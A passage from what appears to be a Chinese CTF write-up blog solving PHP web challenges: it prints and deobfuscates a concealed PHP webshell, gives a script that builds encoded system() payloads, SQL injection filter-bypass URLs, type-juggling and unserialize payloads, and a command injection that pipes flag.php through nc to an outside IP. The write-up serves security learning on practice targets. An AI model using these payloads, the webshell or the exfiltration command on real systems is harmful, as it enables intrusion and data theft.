*/$f=&apos;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&apos;;/*</span><br><span class="line"> */$O=&apos;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&apos;;/*</span><br><span class="line"> */$w=&apos;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&apos;;/*</span><br><span class="line"> */$P=&apos;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3&apos;;/*</span><br><span class="line"> */$i=&apos;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&apos;;/*</span><br><span class="line"> */$x=&apos;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;$sl=&quot;s)m&apos;;/*</span><br><span class="line"> */$y=str_replace(&apos;b&apos;,&apos;&apos;,&apos;crbebbabte_funcbbtion&apos;);/*</span><br><span class="line"> */$c=&apos;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&apos;;</span><br><span class="line"></span><br><span class="line">echo $c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H;/*</span><br><span class="line"> *///$L=str_replace(&apos;)m&apos;,&apos;&apos;,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/*</span><br><span class="line"> //*///$v=$y(&apos;&apos;,$L);$v();/*</span><br><span class="line"> //*/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>干他妈的代码混淆！写个py脚本把他们全部拼在一起之后把)m全部去掉，记得过程中要把里面的双引号全部用反斜杠转义掉。然后找个在线代码美化工具美化以下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str=&quot;$kh=\&quot;4f7)m)mf\&quot;;$kf=\&quot;2)m)m8d7\&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=\&quot;\&quot;;for()m$i=0;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)mR;$rr)m=@$r[)m\&quot;HTT)mP_RE)mFERER\&quot;];$ra)m=)m@$r[\&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m\&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p)marse_)mstr)m($u[\&quot;q)muery\&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m\&quot;/([\w)m])m)[\w-)m]+(?:;q=0.)m([\d)m]))?,?/\&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=\&quot;sub)mstr\&quot;;$sl=\&quot;s)mtrt)molower\&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3)m));)m$p=\&quot;\&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m[$i]=\&quot;\&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif($e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(\&quot;/_)m/\&quot;,\&quot;/-/)m\&quot;),)marray()m\&quot;/\&quot;,\&quot;+\&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(\&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m\&quot;);@sessio)mn_d)mestroy();&quot;</span><br><span class="line">print str.replace(&apos;)m&apos;,&apos;&apos;)</span><br><span class="line">&lt;?php</span><br><span class="line">$kh = &quot;4f7f&quot;;</span><br><span class="line">$kf = &quot;28d7&quot;;</span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;//每一位都做一次与运算</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$r[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br><span class="line">if ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[&quot;query&quot;], $q);//将referer的query部分解析到q,也就是url中?后面的查询数据</span><br><span class="line">    $q = array_values($q);//将数组的值给q</span><br><span class="line">    </span><br><span class="line">    //对accept_language进行正则匹配，最终结果为一个包含三个 n个元素的数组</span><br><span class="line">    preg_match_all(&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;, $ra, $m);</span><br><span class="line">    if ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s = &amp; $_SESSION;</span><br><span class="line">        $ss = &quot;substr&quot;;</span><br><span class="line">        $sl = &quot;strtolower&quot;;</span><br><span class="line">        $i = $m[1][0] . $m[1][1];//这个是accept_language的以每个逗号为分隔符的前两个段的首字母  两个字母进行拼接得到了$i</span><br><span class="line">        $h = $sl($ss(md5($i . $kh) , 0, 3));//$i 和 4f7f拼接而成经过md5之后的头三位</span><br><span class="line">        $f = $sl($ss(md5($i . $kf) , 0, 3));//$i 和 28d7拼接而成经过md5之后的头三位</span><br><span class="line">        $p = &quot;&quot;;</span><br><span class="line">        for ($z = 1; $z &lt; count($m[1]); $z++) $p.= $q[$m[2][$z]];//把？后面的元素中的第language编号个元素拼接进p中</span><br><span class="line">        if (strpos($p, $h) === 0) &#123;//看 h 是否在 p 的开头</span><br><span class="line">            $s[$i] = &quot;&quot;;//创建了一个空的元素</span><br><span class="line">            $p = $ss($p, 3);//头三位字母之后的东东</span><br><span class="line">        &#125;</span><br><span class="line">        if (array_key_exists($i, $s)) &#123;//如果i这个键在s中存在~~也即是说上面那个if一定要进去</span><br><span class="line">            $s[$i].= $p;</span><br><span class="line">            $e = strpos($s[$i], $f); //找结束标志，那三位md5码</span><br><span class="line">            if ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array(&quot;/_/&quot;,&quot;/-/&quot;) , array(&quot;/&quot;,&quot;+&quot;) , substr($s[$i], 0, $e))) , $k)));</span><br><span class="line">                //把最后的结束标志之后的东西去掉之后进行操作  k是4f7f28d7 拿来还要做一个按位与的运算</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o) , $k));</span><br><span class="line">                print (&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析过程在代码注释中给出了一部分。要重点关注我们的payload是怎么传递进去的以及其中正则表达式的含义。</p>
<p>解释以下accept-language中的<code>zh-CN,zh;q=0.8,zh-TW;q=0.7</code>，这里只是一个例子，首先不同项目之间用逗号来分割开来，最开始的zh-CN表示默认语言，这里是中国大陆的语言，然后下一个是zh，q代表这个语言的权重。逆脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function x($t, $k) &#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; $l;) &#123;</span><br><span class="line">        for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o.= $t&#123;$i&#125; ^ $k&#123;$j&#125;;//每一位都做一次与运算</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function outpayload($cmd)&#123;</span><br><span class="line">    $cmd = &quot;system(&apos;&quot;.$cmd.&quot;&apos;);&quot;;</span><br><span class="line">    $gzcmd = gzcompress($cmd);</span><br><span class="line">    $xgzcmd = x($gzcmd, &quot;4f7f28d7&quot;);</span><br><span class="line">    $paylaod = base64_encode($xgzcmd);</span><br><span class="line"></span><br><span class="line">    return &apos;675&apos;.$paylaod.&apos;a3e&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这个是将网页内容拿回来解密的函数</span><br><span class="line">function getresult($str)&#123;</span><br><span class="line">    $result = base64_decode($str);</span><br><span class="line">    $result = x($result, &quot;4f7f28d7&quot;);</span><br><span class="line">    $result = gzuncompress($result);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line">echo outpayload(&quot;cat this_i5_flag.php&quot;);</span><br><span class="line">echo getresult(&quot;TPqE1x3wTNfRNH6te3Qzh2E2MLfnUeIhki8xAPuCrV5SD41A9JGijSKvng+IEeJe0g9eYHRxchFy092wjmSSQWhmXcQj5A==&quot;);</span><br></pre></td></tr></table></figure>
<p>然后burpsuite发送请求如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /Challenges/b4ckdo0r.php HTTP/1.1</span><br><span class="line">Host: 751ad4fb456642ada231c61e6ac36d9dcb186eb4b1f14ac1.changame.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,zh-CN;q=0.0  //要重点关注这个0.0和这一行的元素个数</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=166f2f5e071449-0f8f8e0b614dd6-4c312979-144000-166f2f5e07416b; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; __jsluid=76c3e9ad4068b3acc239c7ac441a05ba</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line">Referer:http://1.1.1.1/index.php?a=675TPocyB4WLfrhNngoHmlM/vxKuakGtSv8fSrgTfoQNOCAYDfe2zKYa3e</span><br></pre></td></tr></table></figure>
<p>回显的东西放进解码函数里面跑一下就出来了。</p>
<h2 id="in-a-mess">in a mess</h2>
<p>题目链接<br>
进入之后查看源码得到以下源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;&lt;!--index.phps--&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: index.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Hahahahahaha&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;//substr函数不会忽略%00但是strlen会忽略，eregi的比较是弱类型</span><br><span class="line">	require(&quot;flag.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url/index.php?id=0a&amp;b=%0011111111&amp;a=php://input</span><br><span class="line">post: 1112 is a nice lab!</span><br></pre></td></tr></table></figure>
<p>然后得到一个url路径,进去发现原来的url后面自动增加了index.php?id=1，有可能是sql注入，这里空格被过滤，使用<code>/**/被过滤，使用/*1*/可以绕过</code>。</p>
<p>union和select、from均被过滤，依靠<code>双写</code>来绕过。</p>
<p>注意爆出表明之后想要获取列名直接在where中写<code>where table_name=&quot;content&quot;</code>不行，但是可以<code>16进制</code>来绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,(seleselectct/*1*/group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74)</span><br><span class="line"></span><br><span class="line">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,(seleselectct/*1*/group_concat(id,context,title)/*1*/frfromom/*1*/content)</span><br></pre></td></tr></table></figure>
<h2 id="babyphp-boot2root">babyphp (boot2root)</h2>
<p>题目源码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>; </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$str1 = $_GET[<span class="string">'1'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123; <span class="comment">//使用0e215962017，它的md5值0e291242476940776845150308577824，当然不唯一，生成脚本和验证方法见下</span></span><br><span class="line">        <span class="keyword">echo</span> $flag1; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$str2 = $_GET[<span class="string">'2'</span>]; </span><br><span class="line">$str3 = $_GET[<span class="string">'3'</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123; <span class="comment">#传入两个数组这样都是false了，当然可以相等</span></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123; </span><br><span class="line">            <span class="keyword">echo</span> $flag2; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>();    </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123; </span><br><span class="line">    <span class="keyword">var</span> $temp; </span><br><span class="line">    <span class="keyword">var</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123; </span><br><span class="line">    $str4 = $_GET[<span class="string">'4'</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123; </span><br><span class="line">        $str4=stripslashes($str4); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    $res = unserialize($str4); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($res) &#123; </span><br><span class="line">	$res-&gt;flag=$flag3; </span><br><span class="line">	<span class="comment">#使用引用</span></span><br><span class="line"><span class="comment">/* &lt;?php</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">class Secrets &#123;</span></span><br><span class="line"><span class="comment">    var $temp;</span></span><br><span class="line"><span class="comment">    var $flag;</span></span><br><span class="line"><span class="comment">    function __construct()</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $this-&gt;temp = &amp;$this-&gt;flag;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">echo serialize(new Secrets()); */</span></span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;flag === $res-&gt;temp) </span><br><span class="line">            <span class="keyword">echo</span> $res-&gt;flag; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">die</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1=0e215962017&amp;2[]=a&amp;3[]=b&amp;4=O:7:%22Secrets%22:2:&#123;s:4:%22flag%22;N;s:4:%22temp%22;R:2;&#125;</span><br></pre></td></tr></table></figure>
<p>md5生成脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 抄dalao的脚本</span></span><br><span class="line"><span class="comment">#-*-encode:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateMD5</span><span class="params">()</span>:</span></span><br><span class="line">    pattern = <span class="string">"^0+e[0-9]+$"</span></span><br><span class="line">    <span class="comment"># 被识别成若干0开头加上e开头的强制类型转换后会被视为科学计数法中的0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">1000000</span> ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        s = <span class="string">'0e'</span>+str(i)</span><br><span class="line">        md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">        flag = re.search(pattern,md5)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"source:"</span>,str(s))</span><br><span class="line">            print(<span class="string">"md5:"</span>,str(md5))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generateMD5()</span><br></pre></td></tr></table></figure>
<p>验证方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashlib.md5(&quot;0e215962017&quot;.encode(&apos;utf-8&apos;)).hexdigest()</span><br></pre></td></tr></table></figure>
<h2 id="pingserver-boot2root">pingserver(boot2root)</h2>
<p>查看<code>helper.php~</code>(为什么我就扫描不出来呢？？？)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@$_SERVER[<span class="string">"REMOTE_ADDR"</span>])&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"HTTP_CLIENT_IP"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (@getenv(<span class="string">"REMOTE_ADDR"</span>))&#123;</span><br><span class="line">		$ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$ip = <span class="string">"Unknown"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!(preg_match(<span class="string">'/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m'</span>, $data))) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&lt;center&gt;&lt;h2 style="color:red;"&gt;Shoo Go Away heckermen... Thats not an IP Address&lt;/h2&gt;&lt;/center&gt;'</span>);</span><br><span class="line">	 &#125;</span><br><span class="line">    $black_list = <span class="keyword">array</span>(<span class="string">'"'</span>, <span class="string">"'"</span>, <span class="string">" "</span>,<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_list <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="comment">// if(strpos($data, $key) !== false)&#123;</span></span><br><span class="line">        <span class="comment">//     die("&lt;center&gt; Not Allowed &lt;/center&gt;");</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        $data = str_replace($key, <span class="string">''</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>学习了<code>refip</code>的常见设置，这里发现没有拦截<code>x-forwarded-for</code>，于是在请求头里面添加并赋值为<code>127.0.0.1</code>，发送，回显结果中的关键代码如下图：<br>
<img src="https://user-images.githubusercontent.com/40637063/55333592-3290fb00-54ca-11e9-8816-f316ed169091.png" alt></p>
<p><code>ping -c 4</code>表示发送四个报文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http://3.17.167.161/PingService/ --data &quot;ip=8.8.8.8%0a;cat$&#123;IFS%?&#125;flag.php|nc$&#123;IFS%?&#125;207.148.64.125$&#123;IFS%?&#125;8000&quot; --header &quot;x-forwarded-for:127.0.0.1&quot;</span><br></pre></td></tr></table></figure>
<p>我试了一下，将分割符号中的<code>%?</code>去掉也是可以的<br>
<img src="https://user-images.githubusercontent.com/40637063/55333654-58b69b00-54ca-11e9-8279-d88d243c7cff.png" alt></p>
<h2 id="dragonscim-workshop">dragonscim workshop</h2>
<p>真的脑洞题目，题目提示：</p>
<blockquote>
<p>DragonScim is holding it’s PKing workshop again!<br>
Word on the street is the admins get into the console via the Contact.<br>
They thought it might be clever and crafty if they also just created<br>
their name with inspiration from fish that collide with themselves.<br>
Oh, and lastly, they’ve left a joke for us.<br>
Here it is:<br>
How do you kill a circus?<br>
You go for the juggler.<br>
Also, the admins love Maryland a lot… They’ve been there 5 times.</p>
</blockquote>
<p>这个提示和谜语一样晦涩难懂。然后根据提示看起来只能利用contact界面中的name参数来找突破口了。传入的<code>url：/contact.php?name[]=aaa</code>,报错。</p>
<blockquote>
<p>Warning: md5() expects parameter 1 to be string,<br>
array given in /var/www/site/contact.php on line 76<br>
Thanks for your message Array, it has been received.</p>
</blockquote>
<p>错误的参数试探出了md5函数，结合题目给出的隐晦提示，从老外那里看到的说是原始值和MD5值相同，而且是==而不是强等于。</p>
<blockquote>
<p>php 手册：如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>
该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> 抄dalao的脚本</span><br><span class="line"><span class="comment">#-*-encode:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateMD5</span><span class="params">()</span>:</span></span><br><span class="line">    pattern = <span class="string">"^0+e[0-9]+$"</span></span><br><span class="line">    <span class="comment"># 被识别成若干0开头加上e开头的强制类型转换后会被视为科学计数法中的0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">1000000</span> ==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">        s = <span class="string">'0e'</span>+str(i)</span><br><span class="line">        md5 = hashlib.md5(s).hexdigest()</span><br><span class="line">        flag = re.search(pattern,md5)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            print(<span class="string">"source:"</span>,str(s))</span><br><span class="line">            print(<span class="string">"md5:"</span>,str(md5))</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generateMD5()</span><br></pre></td></tr></table></figure>
<p>最后将得到的source值传递进name就可以了</p>
<h2 id="ichunqiu-百度杯getflag">ichunqiu 百度杯getflag</h2>
<p>知识点：php自定义定界符<code>&lt;&lt;&lt;</code> ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;&lt;&lt;a</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>相当于是<code>“flag”</code> ,注意最后还有一个换行符，将这部分进行url编码后传入。请求头也要自己造</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST /Challenges/flag.php HTTP/1.1</span><br><span class="line">Host: xxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">flag=%3c%3c%3c%61%0a%66%6c%61%67%0a%61%3b%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/57857218-3f22a600-7821-11e9-88a5-624bf3bb442f.png" alt="image"></p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>Django学习笔记</title>
